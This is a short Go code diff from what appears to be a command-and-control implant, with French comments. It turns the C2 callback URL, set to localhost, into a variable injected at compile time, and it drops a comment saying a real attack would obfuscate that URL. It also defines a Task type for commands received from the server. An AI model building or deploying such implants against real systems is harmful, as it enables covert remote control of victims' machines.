@@ -11,8 +11,8 @@ import (
 )
 
 // C2_URL est l'URL du serveur de Command & Control.
-// Dans une vraie attaque, cette URL serait obfusquée et dynamique.
-const C2_URL = "http://localhost:8000/c2/implant/callback"
+// Cette valeur sera injectée au moment de la compilation.
+var C2_URL = "http://localhost:8000/c2/implant/callback"
 
 // Task représente une commande reçue du C2.
 type Task struct {
